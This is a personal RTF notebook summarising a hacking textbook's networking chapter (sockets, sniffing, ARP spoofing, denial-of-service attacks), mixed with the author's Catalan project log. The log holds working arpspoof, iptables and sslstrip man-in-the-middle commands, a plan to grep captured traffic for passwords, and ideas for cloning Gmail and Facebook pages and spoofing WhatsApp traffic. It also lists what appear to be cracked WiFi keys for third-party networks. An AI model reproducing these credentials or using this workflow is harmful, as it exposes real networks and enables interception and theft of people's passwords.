{\rtf1\ansi\ansicpg1252\cocoartf1138\cocoasubrtf470
{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
\paperw11900\paperh16840\margl1440\margr1440\vieww12280\viewh10940\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural

\f0\fs34 \cf0 live cd: setxkbmap es \
to set the keyboard layout to es in the console\
\
file trasfer:\
---------------------\
netcat!\
\
mac:\
	nc -l <port> > file\
\
virtualmachine:\
	nc <ip> <port> < file\
------------------------------------------\
\
share folders\
\
sudo apt-get install smbfs\
sudo mkdir /mnt/cifs\
sudo mount -t cifs //ip/sahrefolder /mnt/cifs -o username=\'85,password=\'85,domain=...\
\
\
================\
| 0x400 Networking |\
================\
\
	network apps using sockets\
	deal with common network vulnerabilities\
\
\
\
0x410 osi Model\
=============\
\
	router and firewall hw focus on lower layers ignoring higher layer encapsulation\
\
	physical layer: communicate raw bits. activate maintain and deactivate bt-streams\
	data-link layer: transfer data between two points, error  correction and flow control. activating, maintinig and deactivate data link connections\
	Network Layer: middle ground, pass info between lower and higher layers, and provide addressing and routing\
	Transport layer: provides transparent transfer of data between systems. Reliable data communication, cost-effectiveness calculations\
	Session layer: establishing and maintaining connections between network applications\
	Presentation layer: presenting data to applications in a syntax or language they understand (encryption, data compression, \'85)\
	Application lyaer: keeping track of the requirements of the application\
\
\
Packet encapsulation.\
	on each layer a packet has a header and the payload.\
		header: protocol information needed for that layer\
		payload/body: data for that layer/ header and body of the higher layer\
\
	Writing network programs is just a matter of using the network interface of the OS\
\
0x420 Sockets\
===========\
		socket = standard way to perform network communication through the OS\
	\
	socket is transmitted at the session layer (5)\
	the lower layer are hanndled by the OS, which takes care of routing\
	\
	Most common types of sockets: stream sockets and datagram sockets\
	other types of sockets?\
	Raw sockets, raw ip sockets, transport layer is bypassed, packet headers are accessible to the application\
	non-Internet sockets:  implemented over other transport protocols like SNA\
	Unix domain sockets (UDS) for internal inter-process communication\
\
\
	Stream sockets\
		like phone calls\
		reliable two -way communication\
		one side initiates the connection to the other, after established either side can communicate to the other\
		immediate confirmation on every packet send\
		use TCP (layer 4 transport of the OSI model)\
		TCP designated so that data arrives without errors and in sequence\
\
	Datagram sockets\
		like mailing a letter\
		one-way connection only, unreliable\
		use UDP (User datagram Protocol) , implying that can be used to create custom protocols\
		not a real connection, but a basic method for sening data from one point to another\
		no overhead, but protocol doesn't do much\
		UDP commonly used in networked games and streaming media, since developpers can tailor their commynications exactly as needed without the built-in overhead of TCP\
\
	0x421 Socket Functions\
	--------------------------------\
		sockets use file descriptors (like files) to identify themselves\
		can use read() and write() functions to receive and send data using socket file descriptors\
		Also functions specifically designed for dealing with sockets.\
		/usr/include/sys/sockets.h\
\
		socket(int domain, int type, int protocol)\
			return fd or -1\
\
		connect(int fd, struct sockaddr *remote_host, socklen_t addr_length)\
		connects a socket to a remote host\
		0 on succes -1 on error\
\
\
		bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)\
		Binds a socket to a local address so it can listen for incoming connections, 0 on success -1 on error\
\
		listen(int fd, int backlog_queue_size\
		listens for incoming connections and queues connection requests up to backlog_queue_size\
\
		accept(int fd, sockaddr *remote_host, socklen_t *addr_length)\
		accepts and incoming conn on a bound socket. addres info of the remote host is written in the remote_host structure\
		returns a new socket fd to identify the connected socket or -1 on error\
\
		send(int fd, void *buffer, size_t n, int flags)\
		sends n bytes from *buffer to socket fd; return number of bytes sent or -1\
\
		recv(int fd, void *buffer, size_t n, int flags)\
		receives n bytes from socket fd into *buffer; return the num of butes received or -1 on error\
\
\
\
\
		domain refers to the protocol family of the socket,\
		(standard Internet Protocol, AX.25)\
			families of protocols defined in bits/socket.h included in sys/socket.h\
		from /usr/include/bits/socket.h\
			some protocol families, PF_INET, PF_INET6, PF_x25, PF_ATMPVC\
		\
		from /usr/include/bits/socket.h\
			some socket types, SOCK_STREAM , SOCK_DGRAM,\
\
	final argument of socket() must be always 0, almost always be 0 (the protocol)\
	in practice most protocol families have onlyl one protocol\
	\
	0x422 Socket Addresses\
	---------------------------------\
\
		sockaddr structure to pass address info to define a host\
\
		\
		from /usr/include/bits/socket.h\
			sockaddr struct\
\
			struct sockaddr\
				\{\
					__SOCKADDR_COMMON (sa_); /* common data: address family and length */\
					char sa_data[14];	/* Address data. */\
				\}\
\
			SOCKADDR_COMMON is an unsigned short, defines address family of the address. Possible address families defined in /bits/socket.h, usually translate directly to the corresponding protocol families.\
			from /usr/include/bits/socket.h\
			#define AF_INET PF_INET\
			#define AF_INET6	PF_INET6\
			...\
	\
\
			depending on the address family there are other address structures, that containt the common element from the sockaddre structure and info specific to the address family.\
			they are also the same size -> they can be typecasted to and from each other. the socket() function will simply accept a pointer to a sockaddrr structure, which can be in fact an address structure for IPv4, IPv6 or X.25\
			in this book PF_INET and AF_INET, defined in netinet/in.h\
\
			/usr/include/netinet/in.h\
			struct sockaddr_in\
			\{\
				__SOCKADDR_COMMON (sin_);\
				int_port_t sin_port; //port number\
				struct in_addr sin_addr; //Internet address\
\
				//pad to size of sockaddr\
				unsigned char sin_zero[sizeof(struct sockaddr) - __SOCKADDR_COMMON_SIZE - sizeof(in_port_t) - sizeof(Struct in_addr)];\
\
			\}\
\
\
			SOCKADDR_COMMON is the unsigned short int mentioned above used to define the address family\
			int_port_t is 16-bit short\
			in_addr structure contains a 32-bit number\
			the rest is 8 bytes of padding\
	\
	0x423 Network Byte Order\
	------------------------------------p216 202\
\
			network byte order is big-endian, port number and IP address used in the AF_INET socket address struct use the network byte order (big endian)\
\
			these values must be converted\
		\
			functions for conversion netinet/in.h and arpa/inet.h include files\
\
			htonl(long value) Host-to-Network Long\
				32bit interget from the host's byte order to network byte order\
\
			htons(short value)\
\
			ntohl(long value) Network-to-Host Long\
			32bit integer from network byte order to the host's byte order\
			\
			ntohs(long?short? value)\
	\
\
			for compatibility with architectures, functions must be used even if the host is using a processor with big-endian byte ordering\
\
	0x424 Inernet address Conversion\
	----------------------------------------------p217 203\
		\
\
	inet_aton(char *ascii_addr, struct in_addr *network_addr)\
\
	inet_ntoa(struct in_addr *network_addr)\
		returns a pointer to a string ASCII with the IP, string is held statically allocated memory buffer , so the next call to the function overwrites the result\
\
\
	0x425 A Simple Server Example\
	-------------------------------------------\
\
\
	=============\
	*RESUM RAPID*\
	=============\
	\
\
		sockets: stream sockets(TCP/IP) datagram sockets(UDP/IP) , raw sockets, unix sockets, no internet sockets\'85\
\
\
		esquemas funcionament:\
		---------------------------------\
	\
			server-side\
				fd=socket()						//assign a filedescriptor\
				setsockopt(fd,..)				//options , reusing port if not closed ..\
				bind(fd, host_addr,\'85) 			//bind to ip & port\
				listen(fd, queue_size)  		//set queue size and start listening\
				while(1)\
				\{\
					new_fd = accept(fd, \'85) 	//process a request/connection\'85\
					//PROCESSING\
					fork(), send(), recv(), close(),...\
				\}\
\
\
			 client-side:\
				socket()\
				connect()\
				send(), recv(), close()\'85\
\
\
		socket addresses\
		------------------------\
\
			socket protocol family and address family\
\
			struct sockaddr \{\
				__SOCKADDR_COMMON (sa_);\
				char sa_data[14];\
			\}\
\
			sockaddr_in(FAMILY, port, ip address, padding), and other structs from each family, same size as sockaddr, can be typecasted to sockaddr when needed\
			ex:\
				struct sockaddr_in host_addr;\
				\'85\
				host_addr.sin_family = AF_INET;\
				host_addr.sin_port = htons(PORT);\
				host_addr.sin_addr.s_addr = 0; //own ip\
				memset(&(host_addr.sin_zero), '\\0',8);\
				bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr))\
\
		Network byte order:htonl, htons, ntohl, ntohs\
		Internet Address conversion: inet_aton(), inet_ntoa\
			\
\
\
\
	0x426 A Web Client Example\
	---------------------------------------\
	\
		HTTP\
			application layer, plain text (like POP3, SMTP, IMAP, FTP)\
\
		GET / HTTP/1.0 \
				get resource-path http-protocol-version\
\
		HEAD\
			return only the headers\
\
		carriage return '\\r' 0x0D and new line '\\n' 0x0A\
\
\
		send_string() and recv_line()\
			take care of sending al the string and receiving till the \\r\\n\
\
		DNS\
			domain name service\
			/usr/include/netdb.h\
				gethostbyname(char *hostname) -> returns &hostent structure\
\
			struct hostent\
			\{\
				char *h_name;  //official name of host\
				char **h_aliases; //alias list\
				int h_addrtype; //host address type\
				int h_length; //length of address\
				char **h_addr_list; //list of addresses from name server\
				#define h_addr h_addr_list[0] //adddress for backward compatibility\
			\}\
\
			host_lookup.c\
				host_info = gethostbyname(argv[1])\
				\'85\
				address = (struct in_addr *)(host_info->h_addr)\
\
\
\
\
			webserver_id.c\
\
				strncasecmp(buffer, "Server:", 7) == 0\
					compares 7 first bytes of the strings ignoring case, return 0 if match\
\
\
	0x427 A Tinyweb Server\
	--------------------------------\
\
		tinyweb.c\
\
			handle_connection(int sockfd, struct socakaddr_in *client_addr_ptr)\
				\
				strstr(request, " HTTP/")\
				strncmp(request, "GET ", 4) == 0\
\
\
				enviament:\
					enviar headers\
					open file/resource: fd = open(resource, O_RDONLY,0);length = get_file_size(fd)\
					malloc: ptr = (unsigned cahr *) malloc(length)) \
					read to memory:  read(fd,ptr, length)\
					send from memory:  send(sockfd, ptr, length, 0)\
\
				get_file_size(int fd)\
				\{\
					struct stat stat_struct;\
					if (fstat(fd, &stat_struct) == -1)\
						return -1;\
					return (int)stat_struct.st_size;\
				\}\
\
\
\
0x430 Peeling Back the Lower Layers\
=============================\
\
			at upper layers many protocols are plaintext since all other details are taken care, all OSI layers are taken care.\
			sockets exist on the session layer (5) providing interface to send and receive from one host to another\
			tcp on transport layer (4) provides reliability and transport control\
			IP on network layer (3) provides addressing and packet-level communication\
			ethernet layer (2) provides addressing between Ethernet ports (for LAN\
			physical layer (1) protocol to send bits from one device to another\
\
	0x431 Data-link Layer\
	-----------------------------\
\
		Ethernet exists on this layer\
		MAC addressess (media access control)\
			unique, haardware addreesses (in integrated circuit mem), like social security number for hardware\
		header 14 bytes\
\
		IP's change, MAC's don't\
		ARP on top of data-link\
		ARP  messages (most important ARP request messages and ARP reply messages)\
			ARP request is broadcast to find mac addres of an IP\
			ARP cache on each system\
\
	0x432 Network Layer\
	----------------------------\
		20 bytes header\
		RFC 791 internet protocol version 4 IP PACKETS \
		AND ICMP PACKETS	\
		Internet control message protocol ICMP\
			ICMP echo request and echo reply -> ping\
\
\
		connectionless\
\
\
		packet size limitation:  IP FRAGMENTATION					fragment offset value stored in the header\
					doesn't maintain connection or ensure delivery, only aid in the delivery (and makes things difficult for IDS!!!)\
\
\
	0x433 Transport Layer\
	------------------------------\
\
			major protocols TCP and UDP\
\
			TCP: bidirectional connection. \
				reliable -> ensure data will reach its destination in proper order\
				if packets arribe out of order TCP will reassemble them in order\
				if packets are lost, destination holds packets it has while source retransmits the missing packets\
\
			TCP flags (make possible the protocol)\
					URG, ACK, PSH, RST, SYN, FIN\
\
			TCP header RFC 793\
\
				SYN  and ACK for the three-way handshaking process\
				client -> SYN on, ACK off -> Server\
				client <- SYN/ACK on --<--Server\
				client -> ACK on --> Server\
\
				seq# and ack# on every packet\
\
\
		UDP much less overhead , RC 768  (4 16bit values : source port, destination port, length and checksum)\
\
\
0x440 Network Sniffing\
==================\
\
		Switched and unswitched network -> data-link layer\
			unswitched network - > ethernet packets pass through everydevice\
									expecting devices only look at packets with its MAC address or broadcast\
			\
\
	-->promiscuous mode: sudo ifconfig eth0 promisc\
\
	-->Sniffing with tcpdump\
			sudo tcpdump -l -X 'ip host 192.168.0.118'\
\
	--> dsniff\
			sudo dsniff -n \
\
\
	0x441 Raw Socket Sniffer\
	-----------------------------------\
		stream sockets -> in the session  layer (5)\
		raw sockets -> in the network layer (4)\
			SOCK_RAW as the type\
			IPPOTO_TCP, IPPROTO_UDP, IPPROTO_ICMP, IPPROTO_RAW\
\
			sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)\
\
		tcp sniffing using raw sockets\
		raw_tcpsniff.c\
			u_char  defined in sys/socket.h for unsigned char\
			only captures tcp packets\
			to capture udp or icmp packets, create a socket for each one\
			raw sockets code is inconsistent between systems no multiplatform\
\
	0x442 libpcap sniffer\
	---------------------------\
\
		standardized programming library for raw sockets\
		tcpdump and dsniff use libpcap\
\
		pcap_sniff.c\
\
		gcc -p pcap_sniff pcap_sniff.c -l pcap\
\
\
	idea programar un sniffer actiu amb \
			modificacio programada de paquets-> modificacio de text\
												-> segons protocol crear nous paquets\
\
			routing\
			dns spoofing  ->\
			servidor apache copiar url's de gmail, facebook, ...\
	\
	0x443 Decoding the Layers\
	------------------------------------\
\
		Ethernet header\
		/usr/include/linux/if_ethernet.h  for ethernet header\
		/usr/include/netinet/ip.h   for ip header\
		/usr/include/netinet/tcp.h  for ethernet header\
\
			\
		create own packet header structures to include in hacking-networks.h\
\
		__be16 typedef? -> search with grep\
		grep -R "typedef.*__be16" /usr/include\
		grep -R "typedef.*__u16" /usr/include	\
\
\
		ETH_HLEN   ethernet header length for compatibility with padding (some compilers add padding to structs to 4 byte align" so sizeof(struct ethhdr) can return inccorrect value.\
\
\
		/usr/include/netinet/ip.h  ->iphdr struct always 20 byte\
		/usr/include/netinet/tcp.h  ->tcphdr struct\
					TCp header always 32 bit (optional fields not used)\
					dataoffset = num of 32bit words, so data offset field = tcp header size in bytes / 4\
		\
		decode_sniff.c\
\
\
		--> decode_sniff2\
				->afegir capa html?\
				->afegir capa whatsapp?\
				->crear nou socket y reenviar a la destinaci\'f3\
\
\
\
	0x444 Active Sniffing\
	----------------------------\
			in a switched network environment\
				switch only sends through ports assocaited with certain MAC addresses\
\
			ARP spoofing - ARP redirection - ARP cache poisoning\
					no state info about ARP traffic is kept\
							system accepts ARP reply even if they didn't send out an ARP request\
					if ARP reply with an IP address already existing -> overwrites the ARP cache\
					ARP cache has timeout -> attacker must periodically poison the ARP cache of the victims\
\
\
\
		1-ping the ip's to obtain their MAC's on your system arp cache\
			ping -c 1 -w 1 192.168.0.1\
			ping \'85\'85\'85\'85\'85\'85\'85\'85\'85.118\
			arp -na\
			ifconfig eth0\
				now mac/ip of victims are in the attackers cache, so the attacker can then forward the packets (if forwarding actived) when ARP is being redirected to attacker's machine\
\
		2-perform arp redirection with arp spoofed responses\
\
		Nemesis p242\
			inejcting ARP spoofing packets\
			also dns, tcp, udp, ip , rip, data-link/ethernet?..\
\
			per cada protocol escollit s'eespecifiquen les options/parametres de tota la pila de protocols per sota del protocol escollit\
				ARP + data-link\
				dns + tcp + udp + ip + data link\
\
\
----->		Estudi Nemesis i libnet (lectura + proves) p242 -251\
----->		prova sniffer pcap + raw ethernet socket (sense ip forwarding mes iptables)\
				ok-ipspoof amb parametres ip's i MAC\
				ok-ipspoof amb parametres payload dins de tcp\
				agafar decode_sniff \
					a\'efllar el payload per sobre de TCP i dades IP i TCP interessants\
				cridar a ipspoof3 amb parametres ip's, MAC, i payload\
						\
	\
----->		prova sniffer_pcap + libnet\
\
----->		prova sniffer pcap + raw ethernet socket + ip forwarding + iptables\
\
	PROJECTES\
	==========\
		ok-1- airoscript + dsniff arpspoof + sslstrip + bash scripting\
		ok-2- programaci\'f3 raw sockets (per enviar) : spoofing ip,tcp,eth		4- sniff + spoof : raw ether sockets + lib pcap\
		5- sniff + spoof: libnet\
		6- amplification attack: spoofed source broadcast\
		7- sslstrip, SET, and other MITM\
\
\
	0 - dsniff, sslstrip\
	=============	\
			ok-0- wifi en linux\
					iwlist\
					iwconfig\
					ifconfig\
					dhclient\
					wpasupplicant.conf\
\
			ok-1 - usb wifiway - escriure boot: xconf  o boot:live (quan surt error vesacom.c32)\
			ko-2 - airoscript en debian - FALLA!!\
			ko-3 - airoscript en MAC OS X - no te airodump\'bf\'bf\'bf\
				install en XCode: command line tools\
				install macports\
					gmake 3.8\
					sudo port install sqlite3\
					svn aircrack-ng\
					svn airoscript-ng\
					sudo port install xdg-utils\
					sudo mkdir /usr/share/desktop-directories\
					gmake\
\
			ok-4 - contrasenyes\
				WLAN-DE : C001D20211ADE\
				yacom6C8479: 34C83A5719495\
				ONO8588\
		\
		\
			5 - Scan de xarxa\
			6 - MITM\
\
				sudo apt-get install python python-twisted-web\
				download sslstrip,extract, cd, python ./setup.py install\
				ip-forwarding: echo "1" > /proc/sys/net/ipv4/ip_forward\
				iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000\
				sslstrip -w log.txt -l 10000\
\
				apt-get install dsniff\
				arpspoof -i interface -t targe_ip gateway_ip\
			\
				PREGUNTES:\
				===========\
					com desactivar regla iptables? modificar?\
						escriure la mateixa regla pero amb -D (borrar una regla),  -A a\'f1adir una regla, -L listar, -F flush de reglas..\
					prova amb el ip_forward desactivat\
						ok provant amb echo "1"  i echo "0"\
					com arpspoof - prova re-arping victims (com fer via script)					\
						no trobo resposta\'85\
					DESACTIVACIO:\
						1-borrar la regla de iptables  amb -D --> nomes ip-forward						\
						2-re arping? o no cal fer res? en principi no caldria para el arpspoof, pq tenim ip_forwarding, pero en cas de anar lent -> parar tambe el arpspoof\
\
					Detecci\'f3 del password\
					------------------------------\
						ok-script amb grep i expressio regular per trobar linea amb pass=, Pass= , passwd=, password=, p=\
							1-detectta pass detectat\
							2- desconecta sslstrip durant X segons\
							3 - torna a conectarlo					\
\
\
			ok-7 - sslstrip amb desconexio i re-arp un cop detectat el pass\
\
	1 - IP spoofing en C + sockets\
	=========================\
			\
	1er -active sniffing -> arp spooffing  activar  \
	2on -decode_sniff.c --> decodificar html i whatsapp?\
	3er -reenviar sockets\
	     modificar i reenviar sockets\
			simple_server.c\
			tyniweb.c\
	     lectura i comprensio\
		\
		EXEMPLE Raw Socket\
		--------------------------------\
			envia ok\
			problemes segmentation fault -> repas tamanys headers\
			informacio moguda (tamanys o little endian / big endian)\
			veure els limits de tot aixo		\
\
\
			->repas codi\
				version + ihl:  0x45 ,   0100 0101 -> 4 i 5 en cada semi byte = 69\
				\
\
\
				45 | 00 | 00  3c \
				00   00 | 40  00\
				40   06   6c  f8\
				0a   00   02   0f \
				c0   a8   01   0d\
				45   00   00   28\
				d4   31   00   00			\
	\
\
\
				version + IHL 45 | Type of Service 00 |  total Length 00  3c \
\
				identification 00   00 |  Flags + frag offset  40  00\
\
				ttl 40  protocol  06 header checcksum  6c  f8\
\
				source add 0a   00   02   0f \
\
				dest add     c0   a8   01   0d\
							\
	\
tcp\
\
			d6 d8 |  d6 d8 | 67 45 8b 6b | 00 00 00 00 |  \
			00 02 |  ff ff |     00 00   |    00 00 \
\
\
			source port | dest port            \
			d6 d8 |  d6 d8 | \
\
			seq num		ack num\
			67 45 8b 6b | 00 00 00 00 |  \
\
			data offset + flags  | window	\
			00 02 				|  ff ff |    \
\
			checksum  urgent pointer\
			 00 00   |    00 00 \
 problemes en el spoofing IP\
	\
		si no envio un socket raw, el S.O. omple les dades del paq ip header\
		-> per tant cal enviar raw ethernet socket per a omplir un mateix les dades ip header 		\
\
\
		tenir clar quines estructures de dades de ip.h i tcp-h ss'estan usant\
		mides de enviarment mal calculades i per axio no senvia tot el packet\
\
		checksum ip malament i per aixo no senvia?\
\
		tcp header, es el offset * 4, o sigui posar sizeofstruct tcphdr / 4 ?\
\
		libpcap , programes que la usen compilar amb -l pcap\
\
	2- arp spoofing mitm + libpcap sniffing + ip spoofing + whatsapp spoofing\
	========================================================\
		previ:\
			raw_ethernet.c ampliacions:\
				ok-funci\'f3 ipspoof que accepta el payload (TCP/UDP/ICMP + protocol superior)\
\
				temes de passar la MAC, IP, \
					\
			\
\
		proves:\
			ok-1- arpspofing script amb ip victima, que usi la MAC de la victima\
					fagi arpspoof per una banda\
					cridi al programa sniffer passantli la MAC desti original dela ictima i del gateway\'85\
					\
			ok-2-libpcap sniffer que cridi a llibreria per enviar raw socket\
					-funcionament normal (raw socket-forwarding per software) pero fara falta tenir la MAC no spoofejada (ja que aquesta no ve en el packet sniffat)\
					ok-prova realitzada: arpspoof doble entre 1.13 i 1.14\
						ok-decode_sniff_resend3 corrent i reenviant amb raw sockets\
					\
					-problema bulce infinit, al enviar un raw eth socket, el decode sniff el veu tambe i el torna a enviar...\
					-problema del spoof, spoofejar ip de origen a la victima, pero al no victima no espoofejar ip desti(la ip de la victima)\
					-prova realitzada arpspoof(MITM) + decode_sniff_resend + ip spoof\
\
			3-libpcap sniffer -> whatsapp, html \
					-crear estructures de dades amb els resultats de wireshark\
\
			4-enviar nous packets whatsapp o modificar els que s'esta fent forwarding\
\
			5-log de certs protocols\
\
		proves2\
			ipspoof -> enviar packet forjat - OK\
			sniffer + ipspooff (raw ethernet socks)-> falla de moment (usa pcap + raw sockets\
			sniffer + ipspoof (libnet)\
			resta de objectius mitm	\
\
\
	2,5 NEMESIS  and LIBNET proves\
	==========================\
		provar dns  i altres?\
\
	3 - SET amb webserver fet a mida\
	===========================\
\
\
	4 - MITM attack amb https\
	=====================\
\
			realitzar un diffi hellman a dues bandes \'85\
\
				amb la info que rep el mitm del server fa diffi hellam i https normal\
\
				amb la info del server crea un diffie hellman artificial amb la victima del mitm\
\
\
\
	libnet in nemesis and arpspoof p241 - p251\
\
\
\
	0x450 Denial of Service\
	==================\
\
		0x451 SYN flooding\
		--------------------------\
			tcp maintains reliable connections -> in a finite table \
			uses spoofing to take advantage of this limiation\
			\
			for every\
			SYN packet forged ip -> server sens SYN/ACK and saves to a backlog queue\
			half open connections must time out\
			\
\
			synflood.c p252\
				bon exemple de com forjar un nou packet !\
				exemple sobre compilacio de programes amb libnet\
\
\
			prevention against SYN flooding\
				linux -> syncookies, use ack numbers and wait until the ACK to create the connection.\
\
		0x452 The Ping of Death\
		---------------------------------\
\
			ICMP echo messages only 2^16 byte of data\
			overlooked part cuz only header is important\
			som O.S. crashed if they were sent ICMP echo mesages that exceeded size\
	\
			modern systems are all patched against this vuln\
			but new tech's suffer from similar problems (Bluetooth protocol and his L2CAP layer  and a ping packet to measure communication time.\
			Bluesmack\
\
		0x453 Teardrop\
		---------------------\
				vuln in IP fragmentation reassembly:  if the offsets stored in the header are overlapping -> some implementations that didn't check for this irregular condition to crash\
				this happened in OpenBSD kernel with fragmented IPv6 packets (story repeats in early implementations of new products or technologies)\
\
		0x454 Ping Flooding\
		---------------------------\
\
			DoS try to crash or to overload so normal/legitimate connections cannot be done.\
			sending large ping packets, eating his bandwidth\
			it's a bandwidth battle -> if attacker has more bandwidth he can send more data than the victim can receive and deny other traffic.\
\
\
		0x455 Amplification Attacks\
		------------------------------------\
\
			1-attacker sends a spoofed packet from victim's address to the broadcast on a large network,\
			2-the hosts in the network respond to the victim -> flooding him\
	\
			can use ICMP echo requests or UDP echo packets\
			known as smurf and fraggle attacks\
			\
\
		0x456 Distributed DoS Flooding\
		-------------------------------------------\
\
			systems compromised -> daemon installed -> known as a bot\
			forming a botnet\
\
			attacker controls with a controlling program\
\
			great number multiplys effect\
			difficult to track\
\
	0x460 TCP/IP Hijacking\
	================== p 258}